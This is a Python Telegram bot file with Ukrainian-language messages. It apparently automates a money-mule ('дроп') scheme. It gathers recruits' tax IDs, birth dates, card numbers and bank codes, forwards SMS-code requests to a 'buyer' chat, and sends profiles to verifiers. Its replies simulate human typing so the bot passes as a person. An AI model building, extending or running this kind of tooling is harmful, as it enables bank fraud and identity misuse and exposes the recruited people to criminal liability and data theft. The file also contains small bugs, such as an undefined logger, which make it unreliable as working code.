from aiogram import Bot
from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, PhotoSize
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from bot.config import get_admin_id
import bot.database as db
import re
import asyncio

class RegistrationStates(StatesGroup):
    waiting_pib_dob = State()
    waiting_ipn = State()
    waiting_confirm = State()
    waiting_phone = State()
    waiting_password = State()
    waiting_wrong_code_confirm = State()
    waiting_own_number_confirm = State()
    waiting_amobank_instruction_confirm = State()
    waiting_lviv_success_confirm = State()
async def register_reg_msg(state: FSMContext, msg_id: int):
    data = await state.get_data()
    msg_ids = data.get("registration_msg_ids", [])
    if msg_id not in msg_ids:
        msg_ids.append(msg_id)
        await state.update_data(registration_msg_ids=msg_ids)
async def delete_reg_messages(chat_id: int, state: FSMContext, bot: Bot):
    data = await state.get_data()
    msg_ids = data.get("registration_msg_ids", [])
    for msg_id in msg_ids:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    await state.update_data(registration_msg_ids=[])
def get_cancel_keyboard() -> ReplyKeyboardRemove:
    return ReplyKeyboardRemove()
def get_waiting_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
        resize_keyboard=True,
        one_time_keyboard=False,
        is_persistent=True
    )
def clean_pib(pib: str) -> str:
    # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
    pib = re.sub(r'(?i)\b(дата\s+народження|д\.н\.|дн|народження|нар\.?|р\.н\.?)\b', '', pib)
    pib = re.sub(r'^[^\w\s]+|[^\w\s]+$', '', pib)
    pib = re.sub(r'\s+', ' ', pib)
    return pib.strip().title()
async def continue_after_phone(message: Message, state: FSMContext, bot: Bot, client_id: int):
    """Продовження після отримання номера телефону"""
    data = await state.get_data()
    client_password = data.get('client_password')
    success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
    card_photo_id = data.get('card_photo_id')
    client_card = data.get('client_card')
    
    session = await db.get_session(client_id)
    if not session:
        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
        await state.clear()
        return

    username = session.get('username')
    await state.clear()

    # Розпарсимо PIB, DOB, IPN з client_data
    ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
    pib_match = re.search(r'ПІБ:\s*(.+)', session['client_data'])
    dob_match = re.search(r'Дата:\s*(.+)', session['client_data'])
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Інформація про лінію
    line_id = session['line_id']
    line_str = "Не призначено"
    line_id_val = "Невідомо"
    line_phone_val = "Невідомо"
    bank_name = "Банк"
    if line_id:
        line_info = await db.get_line(line_id)
        if line_info:
            line_str = f"Line {line_info['line_id']} Return: {line_info['phone_number']} | {line_info['bank']}"
            line_id_val = str(line_info['line_id'])
            line_phone_val = str(line_info['phone_number'])
            bank_name = line_info['bank']

    phone_number = session.get('client_phone', text if 'text' in locals() else '')
    
    # Спробуємо завантажити шаблон для отримання report_template
    template_data = await db.get_bank_template_db(bank_name)
    custom_tpl = template_data.get('report_template') if template_data else None
    
    if custom_tpl:
        # Використовуємо кастомний шаблон звіту
        display_bank = await db.get_bank_display_name(bank_name)
        replacements = {
            "{pib}": pib,
            "{dob}": dob,
            "{ipn}": ipn,
            "{phone}": phone_number,
            "{username}": username or "Невідомо",
            "{line}": line_str,
            "{line_id}": line_id_val,
            "{line_phone}": line_phone_val,
            "{code}": client_password or "Немає",
            "{card}": client_card or "Немає",
            "{bank}": display_bank or "Невідомий"
        }
        tpl_formatted = custom_tpl
        for placeholder, val in replacements.items():
            tpl_formatted = tpl_formatted.replace(placeholder, str(val))
        anketa_text = tpl_formatted
    else:
        # Стандартний формат звіту (fallback)
        anketa_text = (
            f"ІПН: {ipn}\n"
            f"ПІБ: {pib}\n"
            f"Дата: {dob}\n"
            f"Телефон: {phone_number}\n\n"
        )
        if username:
            anketa_text += f"Дроп - @{username}\n\n"
        anketa_text += f"{line_str}\n\n"
        if client_card:
            anketa_text += f"Номер карти: {client_card}\n\n"
        if client_password:
            anketa_text += f"{client_password}"
            
    anketa_text = anketa_text.strip()
    
    from bot.config import get_anketa_chat_id, get_admin_id
    target_chat = get_anketa_chat_id() or get_admin_id()
    
    try:
        is_bank_kd = bank_name and "bank.kd" in bank_name.lower()
        if success_photo_id and card_photo_id and is_bank_kd:
            from aiogram.types import InputMediaPhoto
            media = [
                InputMediaPhoto(media=success_photo_id, caption=anketa_text),
                InputMediaPhoto(media=card_photo_id)
            ]
            await bot.send_media_group(
                chat_id=target_chat,
                media=media
            )
        elif success_photo_id:
            await bot.send_photo(
                chat_id=target_chat,
                photo=success_photo_id,
                caption=anketa_text
            )
        else:
            await bot.send_message(
                chat_id=target_chat,
                text=anketa_text
            )
    except Exception as e:
        logger.error("Помилка відправки анкети: %s", e)
        try:
            await bot.send_message(
                chat_id=get_admin_id(),
                text=f"Помилка відправки анкети в канал. Анкета:\n\n{anketa_text}"
            )
        except Exception:
            pass

    # Закриваємо поточний банк у сесії
    result = await db.complete_current_bank(client_id, 'success')
    if not result:
        return
    remaining = result['remaining']

    if not remaining:
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await message.answer(
            "Роботу завершили, дякуємо за співпрацю.",
            reply_markup=kbd
        )
        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
        # await db.close_session(client_id)
        
        try:
            await bot.send_message(
                chat_id=get_admin_id(),
                text=f"Верифікацію для клієнта @{username or client_id} успішно завершено по всіх банках! Анкета надіслана."
            )
        except Exception:
            pass
    else:
        await message.answer(
            f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
            reply_markup=ReplyKeyboardRemove()
        )
        
        try:
            await bot.send_message(
                chat_id=get_admin_id(),
                text=f"Клієнт @{username or client_id} пройшов банк {bank_name}. Анкета надіслана. Очікує на наступний банк."
            )
        except Exception:
            pass
def is_wrong_code_text(text: str, chat_history: list = None) -> bool:
    t = text.lower().strip()
    t = re.sub(r'\s+', ' ', t)
    
    # Якщо згадується слово, пароль, пін або прізвище, це стосується пароля/кодового слова, а не SMS-коду
    ignore_keywords = ["слово", "пароль", "пін", "пин", "прізвищ", "фамил", "пошт", "емейл", "email"]
    for ikw in ignore_keywords:
        if ikw in t:
            return False
            
    # Перевіряємо контекст попереднього повідомлення бота
    if chat_history:
        last_assistant_msg = None
        for msg in reversed(chat_history):
            if msg.get("role") == "assistant":
                last_assistant_msg = msg.get("content", "").lower()
                break
        
        if last_assistant_msg:
            # Якщо останнє повідомлення бота було про секретне слово, пароль тощо:
            if any(ckw in last_assistant_msg for ckw in ignore_keywords):
                # Додатково перевіряємо, чи повідомлення є коротким (до 3 слів, наприклад "не підходить", "не працює")
                if len(t.split()) <= 3:
                    return False
    
    # Ключові слова/фрази для некоректного коду
    keywords = [
        # Українські версії та діалекти
        "не підійшов", "не підійш", "не підход", "не підіш", "не підойш", "не подіш",
        "не працює", "не працю", "не робить", "не робе",
        
        # Російські версії, суржик та друкарські помилки (як-от "падашов", "подишов")
        "не подошел", "не подош", "не подхо", "не подиш", "не пидиш",
        "не пидийш", "не пидойш", "не падаш", "не падош", "не падхо",
        "не работает", "не роботает", "не пашет", "не робит",
        
        # Загальні помилки
        "невірн", "не вірн", "неправильн", "не правильн", 
        "не той", "не такий", "код не той", "не ті коди",
        "помилка", "ошибка", "еррор", "error"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False
def is_acknowledgment_text(text: str) -> bool:
    t = text.lower().strip().strip('.').strip('!').strip('?')
    
    ack_words = {
        "добре", "ок", "окей", "оки", "хорошо", "ладно", "пон", "поняв", "зрозумів", "дякую", "спасибі", "спасибо",
        "щас", "ща", "секунду", "сек", "хвилину", "хв", "зачекайте", "почекайте", "зроблю", "сделаю", "зараз зроблю",
        "щас сделаю", "сейчас", "минуту", "минутку", "чекайте", "ожидайте", "1 сек", "1сек", "одну сек"
    }
    
    if t in ack_words:
        return True
        
    phrases = [
        "зараз зроблю", "ща зробу", "ща зроблю", "щас зроблю", "щас сделаю", "секунду чекайте",
        "хвилину зачекайте", "почекайте секунду", "зачекайте секунду", "зараз пройду", "сейчас пройду",
        "вже роблю", "уже делаю", "робиться", "делается"
    ]
    for phrase in phrases:
        if t == phrase:
            return True
            
    return False
def parse_and_validate_date(date_str: str) -> str:
    import datetime
    # Заміна роздільників на крапку
    cleaned = re.sub(r'[^\d]', '.', date_str)
    parts = cleaned.split('.')
    if len(parts) != 3:
        return None
    try:
        day = int(parts[0])
        month = int(parts[1])
        year = int(parts[2])
        if year < 100:
            if year > 26:
                year += 1900
            else:
                year += 2000
        dt = datetime.date(year, month, day)
        current_year = datetime.datetime.now().year
        if year < 1930 or year > current_year:
            return None
        return dt.strftime("%d.%m.%Y")
    except ValueError:
        return None
def is_valid_pib(pib: str) -> bool:
    words = pib.strip().split()
    if len(words) < 2 or len(words) > 4:
        return False
        
    stop_words = {
        "хз", "хто", "хтось", "нічого", "ні", "та", "ну", "да", "ок", "окей", "оки", "ладно", 
        "так", "не", "буду", "хочу", "знаю", "робот", "бот", "автоматизатор", "помічник", 
        "підтримка", "адмін", "адміністратор", "це", "це ваш", "це ваше", "я", "ти", "ми", "ви", "вони"
    }
    
    for w in words:
        w_clean = w.lower().strip().strip('.,!?')
        if w_clean in stop_words:
            return False
        if len(w_clean) < 2:
            return False
        if not re.match(r'^[a-zA-Zа-яА-ЯіІїЇєЄґҐ\'\-]+$', w_clean):
            return False
            
    return True
def is_question_or_objection(text: str) -> bool:
    t = text.lower().strip().strip('?').strip('.').strip('!')
    if "?" in text:
        return True
    question_starters = [
        "що таке", "що це", "як ", "якщо", "де ", "куди", "звідки", "навіщо", "для чого", "чому", "нащо",
        "что такое", "что это", "как ", "где ", "куда", "откуда", "зачем", "для чего", "почему",
        "чи обов'язково", "обязательно", "безпечно", "точно", "правда", "хто ви", "кто вы", "це бот", "это бот",
        "не хочу", "не буду", "нащо", "зачем", "що за"
    ]
    for starter in question_starters:
        if t.startswith(starter) or f" {starter}" in t:
            if starter in ["як ", "как "]:
                words = text.strip().split()
                if len(words) >= 2 and all(w[0].isupper() for w in words if w):
                    continue
            return True
    return False
def is_code_success_text(text: str) -> bool:
    t = text.lower().strip()
    keywords = [
        "підійшов", "підійш", "підійшло", "пройшов", "пройшло", "пройш",
        "прийняв", "прийняло", "все ок", "все гуд", "все добре",
        "подошел", "подошло", "прошел", "прошло", "принял", "приняло",
        "все отлично", "все хорошо", "заработало", "сработало", "запустило"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False
def is_claim_registration_text(text: str) -> bool:
    t = text.lower().strip()
    keywords = [
        "зареєстрував", "зареєструвала", "зареєструвався", "зареєструвалась",
        "все зробив", "все зробила", "все пройшов", "все пройшла",
        "я пройшов", "я пройшла", "я зробив", "я зробила", "я відкрив", "я відкрила",
        "зарегистрировал", "зарегистрировался", "все сделал", "все сделала",
        "все прошел", "все прошла", "я прошел", "я прошла", "я сделал", "я сделала",
        "я открыл", "я открыла"
    ]
    for kw in keywords:
        if kw in t:
            return True
    return False
async def mark_bank_as_failed(client_id: int, bot: Bot):
    session = await db.get_session(client_id)
    if not session or not session.get('line_id'):
        return

    # Прибираємо кнопку запиту коду в Telegram
    if session.get('client_message_id'):
        try:
            await bot.edit_message_reply_markup(
                chat_id=client_id,
                message_id=session['client_message_id'],
                reply_markup=None
            )
        except Exception:
            pass

    result = await db.complete_current_bank(client_id, 'banned')
    if not result:
        return

    remaining = result['remaining']
    if not remaining:
        # Всі банки пройдені! Завершуємо роботу
        kbd = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🔄 Розпочати знову")]
            ],
            resize_keyboard=True,
            one_time_keyboard=False,
            is_persistent=True
        )
        await bot.send_message(
            chat_id=client_id,
            text="На жаль, верифікація саме по цьому банку закінчена. Роботу завершили, дякуємо за співпрацю.",
            reply_markup=kbd
        )
        # Сесію НЕ закриваємо автоматично, щоб адмін закрив її вручну по кнопці
        # await db.close_session(client_id)
        
        try:
            username = session.get('username')
            await bot.send_message(
                chat_id=get_admin_id(),
                text=f"Верифікацію для клієнта @{username or client_id} завершено (останній банк скасовано через реєстрацію на свій номер)."
            )
        except Exception:
            pass
    else:
        # Ще є банки
        await bot.send_message(
            chat_id=client_id,
            text="На жаль, верифікація саме по цьому банку закінчена."
        )
def is_code_request_text(text: str) -> bool:
    if is_code_success_text(text):
        return False
    t = text.lower().strip()
    
    # Прямі запити коду або повідомлення про відправку (близько 60 варіацій)
    trigger_phrases = [
        # Прямі запити коду
        "ще раз", "еще раз", "щераз", "ещераз", "ще один", "еще один",
        "код смс", "смс код", "код пароль", "код з смс", "код із смс", "код из смс",
        "треба код", "треба смс", "треба sms", "надо код", "надо смс",
        "дайте код", "дайте смс", "дайте sms", "дай код", "дай смс",
        "давайте код", "давай код", "чекаю код", "жду код",
        "надішліть код", "надішли код", "скиньте код", "скинь код",
        "отправьте код", "отправь код", "вышлите код", "вышли код",
        "не прийшов код", "не приходить код", "немає коду", "нема коду", "нет кода",
        "не прийшло смс", "не приходить смс", "немає смс", "нема смс", "нет смс",
        "повтор коду", "повторити код", "повтор запиту", "повтори код",
        "ще один код", "новий код", "другий код", "наступний код",
        "код не пришов", "код не приходить", "код не пришел", "код не приходит",
        "код потрібен", "потрібен код", "потрібно код", "потрібна смс",
        "запросити sms-код", "запросити код", "запросити смс-код",
        "запросити смс код", "запросити sms код",
        # Повідомлення про відправку / запит коду користувачем
        "код пішов", "код пошел", "смс пішла", "смс пошла", "код пішло",
        "вже відправив", "вже відправила", "вже надіслав", "вже надіслала",
        "уже отправил", "уже отправила", "уже выслал", "уже выслала",
        "відправив смс", "відправила смс", "надіслав смс", "надіслала смс",
        "отправил смс", "отправила смс", "выслал смс", "выслала смс",
        "надіслав код", "надіслала код", "відправив код", "відправила код",
        "отправил код", "отправила код", "выслал код", "выслала код",
        "надіслати код", "отправить код", "скинути код", "скинуть код",
        "натиснув кнопку", "натиснула кнопку", "нажал кнопку", "нажала кнопку",
        "відправив запит", "отправил запрос", "надіслав запит", "вислав запит",
        "код отправлен", "смс отправлена", "код надіслано", "смс відправлено",
        "відправив уже", "відправила вже", "отправил уже", "отправила уже",
        "все відправив", "все відправила", "все отправил", "все отправила",
        "чекаю на код", "очікую код", "чекаю на смс", "жду смс",
        "код давай", "давай смс", "скинь смс", "скиньте смс",
        "запросив", "запросила", "перезапросив", "перезапросила",
        "перезапросил", "переотправил", "переотправила"
    ]
    
    for phrase in trigger_phrases:
        if phrase in t:
            return True
            
    # Окремі слова-тригери (якщо повідомлення містить це слово або повністю з нього складається)
    single_words = [
        "код", "смс", "sms", "повтор", "повторити", "повторить", "дайте", "треба ще",
        "пішов", "пошел", "пішло", "пошло", "пішла", "пошла", "пошли", "пішли",
        "надіслав", "надіслала", "відправив", "відправила",
        "отправил", "отправила", "выслал", "выслала", "вислав", "вислала",
        "скинув", "скинула", "скинь", "скиньте",
        "надішли", "надішліть", "відправ", "відправте",
        "готово", "відправлено", "отправлено", "надіслано", "выслано",
        "нажал", "нажала", "натиснув", "натиснула", "тицьнув", "тицьнула", "тиснув", "тиснула",
        "запросив", "запросила", "перезапросив", "перезапросила", "перезапросил",
        "переотправил", "переотправила"
    ]
    
    words = re.findall(r'\b\w+\b', t)
    for word in single_words:
        if word in words:
            return True
        if len(word) >= 5 and word in t:
            return True
            
    return False
REFUSAL_KEYWORDS = [
    "нет кода в приложении", "немає коду в додатку", "немае коду в додатку", "немає і не приходить", 
    "нема і не приходить", "нема коду в додатку", "не надходить код", "не приходить код", 
    "не поступает смс", "смс не поступило", "код не поступает", "не поступает код", 
    "код не надходить", "не надіслали смс", "смс не надходить", "не надіслали код", 
    "не приходить смс", "смс не поступает", "смс не приходить", "не надходить смс", 
    "не поступает смс", "код не приходить", "код не надійшов", "код не поступил", 
    "не поступил код", "не приходит код", "код не надійшло", "смс не надійшов", 
    "не приходит смс", "не прислали смс", "не прислали код", "не надійшло смс", 
    "код не приходит", "смс не надійшло", "не надійшов код", "смс не приходит", 
    "не прийшов код", "код не прийшов", "не прийшло смс", "смс не прийшло", 
    "не пришел код", "код не пришел", "не пришло смс", "смс не пришло", "не надсилають", 
    "не поступает", "не приходить", "не присылают", "нічого немає", "не надіслали", 
    "не надходить", "не поступило", "код не идет", "не поступил", "не надійшло", 
    "немає і все", "не приходит", "смс не идет", "не надійшов", "нема нічого", 
    "нічого нема", "не прислали", "ничего нету", "не прийшло", "ничего нет", 
    "не прийшов", "немає коду", "немае коду", "нет кода", "код не йде", 
    "не йде код", "не йде смс", "смс не йде", "немає смс", "не пришло", 
    "немаєкоду", "нема коду", "не пришел", "немае смс", "немакоду", 
    "нема смс", "немаєсмс", "не идет", "немасмс", "не йде", "немає", 
    "пусто", "немае", "нету", "нема", "нет"
]

def is_no_code_text(text: str) -> bool:
    if not text:
        return False
    t = text.lower().strip()
    # Видаляємо знаки пунктуації на початку/кінці, залишаючи літери, цифри та дефіси
    t = re.sub(r'^[^\w\s\-]+|[^\w\s\-]+$', '', t)
    t = re.sub(r'\s+', ' ', t)
    
    if t == "-":
        return True

    for kw in REFUSAL_KEYWORDS:
        if len(kw) <= 4:
            pattern = rf"\b{re.escape(kw)}\b"
            if re.search(pattern, t):
                return True
        else:
            if kw == t or t.startswith(kw) or kw in t:
                return True
                
    return False
async def no_code_message_filter(message: Message) -> bool:
    if not message.text:
        return False
    if not is_no_code_text(message.text):
        return False
    # Перевіряємо статус сесії користувача в БД
    existing_session = await db.get_session(message.from_user.id)
    if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
        return True
    return False
async def simulate_typing(bot: Bot, chat_id: int, duration: float):
    """Імітує процес друку повідомлення в Telegram протягом вказаного часу"""
    start_time = asyncio.get_event_loop().time()
    while asyncio.get_event_loop().time() - start_time < duration:
        try:
            await bot.send_chat_action(chat_id=chat_id, action="typing")
        except Exception:
            pass
        remaining = duration - (asyncio.get_event_loop().time() - start_time)
        sleep_time = min(4.0, remaining)
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)
async def handle_proceedings_screenshot(message: Message, photo: PhotoSize, session: dict, bot: Bot, state: FSMContext):
    """Обробка скріншоту виконавчих проваджень від клієнта"""
    client_id = session['client_id']
    
    # 1. Завантажуємо фото
    import io
    photo_file = await bot.get_file(photo.file_id)
    photo_bytes = io.BytesIO()
    await bot.download_file(photo_file.file_path, photo_bytes)
    img_data = photo_bytes.getvalue()
    
    # 2. ШІ-аналіз скріншоту
    from bot.openai_client import analyze_proceedings_screenshot
    ai_verdict = await analyze_proceedings_screenshot(img_data)
    
    # 3. Скидаємо прапорець очікування
    await db.set_session_waiting_proceedings(client_id, 0)
    
    # 4. Якщо провадження закриті (CLOSED):
    if "[CLOSED]" in ai_verdict:
        # Пересилаємо чистий скріншот у чат верифікаторів як відповідь (reply) на анкету
        from bot.config import get_anketa_chat_id
        anketa_chat_id = get_anketa_chat_id()
        if anketa_chat_id and session.get('verifier_message_id'):
            try:
                await bot.send_photo(
                    chat_id=anketa_chat_id,
                    photo=photo.file_id,
                    reply_to_message_id=session['verifier_message_id']
                )
            except Exception as e:
                logger.error(f"Не вдалося переслати скріншот проваджень верифікатору: {e}")
    else:
        # Якщо відкриті (OPEN) або не вдалося розпізнати: мінусуємо сесію повністю
        from bot.handlers.verifier import process_rejection
        await process_rejection(session, bot, ban=False)
        await state.clear()
async def schedule_waiting_code_reminder(client_id: int, bot: Bot):
    """
    Через 20 секунд перевіряє статус сесії.
    Якщо статус досі 'waiting_code', надсилає повідомлення клієнту.
    """
    await asyncio.sleep(20)
    session = await db.get_session(client_id)
    if session and session['status'] == 'waiting_code':
        try:
            await bot.send_message(
                chat_id=client_id,
                text="Ще очікую поки нададуть код",
                reply_markup=ReplyKeyboardRemove()
            )
        except Exception as e:
            logger.error("Помилка надсилання автоматичного нагадування клієнту %s: %s", client_id, e)
async def trigger_sms_code_request(client_id: int, bot: Bot, state: FSMContext, notify_fn) -> bool:
    """
    Уніфікована логіка запиту SMS-коду з перевіркою cooldown (30 сек).
    """
    import time
    state_data = await state.get_data()
    last_request_time = state_data.get("last_code_request_time", 0)
    current_time = time.time()
    
    cooldown_str = await db.get_setting("sms_cooldown_seconds", "30")
    try:
        cooldown = int(cooldown_str)
    except (ValueError, TypeError):
        cooldown = 30
        
    elapsed = current_time - last_request_time
    if elapsed < cooldown:
        remaining = int(cooldown - elapsed)
        await notify_fn(f"Почекайте ще {remaining} сек. перед наступним запитом коду!", is_error=True)
        return False
        
    session = await db.get_session(client_id)
    if not session or session['status'] == 'completed':
        await notify_fn("Сесія не знайдена або вже завершена.", is_error=True)
        return False
        
    line_id = session['line_id']
    if not line_id:
        await notify_fn("Вам ще не призначено лінію.", is_error=True)
        return False
 
    line_info = await db.get_line(line_id)
    line_num = line_info['line_id'] if line_info else line_id
    bank_name = line_info['bank'] if line_info else "Невідомий банк"

    is_retry = session['status'] == 'waiting_code'

    # Оновлюємо статус сесії на очікування коду
    await db.set_session_status(client_id, 'waiting_code')
    await state.update_data(last_code_request_time=current_time)


    
    # Запускаємо таймер на 20 секунд для автоматичного сповіщення клієнта
    asyncio.create_task(schedule_waiting_code_reminder(client_id, bot))

    # Отримуємо шаблони повідомлень для скупщика (Giver) з бази даних
    giver_format = await db.get_setting("giver_request_format", "Запрос {line_id} {bank_name}")
    giver_retry_format = await db.get_setting("giver_request_retry_format", "Запрос {line_id} {bank_name} (ПОВТОРНО)")

    import random
    sent_codes_count = session.get('sent_codes_count', 0)
    
    if sent_codes_count == 0 and not is_retry:
        first_phrases = [
            "Хвилинку, очікую поки він мені надійде",
            "Хвилинку, зараз очікую поки прийде",
            "Секунду, чекаю поки прийде код",
            "Зараз, чекаю поки надійде код"
        ]
        msg_text = random.choice(first_phrases)
    else:
        subsequent_phrases = [
            "Хвилину",
            "Секунду",
            "сек",
            "щас, чекаю",
            "хв, чекаю",
            "зараз, очікую",
            "чекаю",
            "хвилинку",
            "секунду, чекаю",
            "щас, сек"
        ]
        msg_text = random.choice(subsequent_phrases)
        
    await notify_fn(msg_text, is_error=False, is_retry=is_retry)

    display_bank = await db.get_bank_display_name(bank_name)
    if is_retry:
        try:
            giver_msg = giver_retry_format.format(line_id=line_num, bank_name=display_bank)
        except Exception:
            giver_msg = f"Запрос {line_num} {display_bank} (ПОВТОРНО)"
    else:
        try:
            giver_msg = giver_format.format(line_id=line_num, bank_name=display_bank)
        except Exception:
            giver_msg = f"Запрос {line_num} {display_bank}"

    # Надсилаємо запит постачальнику кодів (Giver)
    from bot.config import get_giver_chat_id, get_admin_id
    try:
        await bot.send_message(chat_id=get_giver_chat_id(), text=giver_msg)
    except Exception as e:
        # Якщо не вдалося надіслати гіверу, повідомляємо адміна
        await bot.send_message(
            chat_id=get_admin_id(),
            text=f"Помилка надсилання запиту гіверу (Line {line_num}): {str(e)}"
        )
    return True
async def send_anketa_to_verifier(client_id: int, bot: Bot) -> int | None:
    """Надсилання анкети у чат верифікаторів"""
    import re
    from bot.config import get_anketa_chat_id, get_admin_id
    
    session = await db.get_session(client_id)
    if not session:
        logger.error(f"Не знайдено сесію для надсилання анкети клієнта {client_id}")
        return None
        
    username = session.get('username') or "Невідомий"
    client_data = session.get('client_data', '')
    
    # Розпарсимо PIB, DOB, IPN
    ipn_match = re.search(r'ІПН:\s*(\d+)', client_data)
    pib_match = re.search(r'ПІБ:\s*(.+)', client_data)
    dob_match = re.search(r'Дата:\s*(.+)', client_data)
    
    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
    pib = pib_match.group(1) if pib_match else "Невідомо"
    dob = dob_match.group(1) if dob_match else "Невідомо"
    
    # Форматування списку банків
    selected_banks_str = session.get('selected_banks', '')
    banks_list = [b.strip() for b in selected_banks_str.split(',') if b.strip()]
    formatted_banks = " | ".join(banks_list) if banks_list else "Не обрано"
    
    drop_line = f"Дроп - @{username}" if username and username != "Немає юзернейму" else "Дроп - Без юзернейму"
    
    anketa_text = (
        f"ІПН: {ipn}\n"
        f"ПІБ: {pib}\n"
        f"Дата: {dob}\n\n"
        f"{drop_line}\n\n"
        f"{formatted_banks}"
    )
    
    anketa_chat_id = get_anketa_chat_id()
    admin_id = get_admin_id()
    if not anketa_chat_id:
        # Автоматично схвалюємо, якщо верифікатор не налаштований
        await db.set_session_verified(client_id, 1)
        await db.set_session_status(client_id, 'registered')
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"⚠️ <b>ANKETA_CHAT_ID не налаштовано!</b>\nАнкету клієнта @{username} (ID: {client_id}) схвалено автоматично.",
                parse_mode="HTML"
            )
        except Exception:
            pass
        return None
        
    try:
        sent_msg = await bot.send_message(chat_id=anketa_chat_id, text=anketa_text)
        await db.update_session_verifier_message_id(client_id, sent_msg.message_id)
        return sent_msg.message_id
    except Exception as e:
        logger.error(f"Помилка відправки анкети в чат верифікаторів: {e}")
        try:
            await bot.send_message(
                chat_id=admin_id,
                text=f"Помилка відправки анкети в чат верифікаторів: {e}\n\nАнкета:\n{anketa_text}"
            )
        except Exception:
            pass
        return None
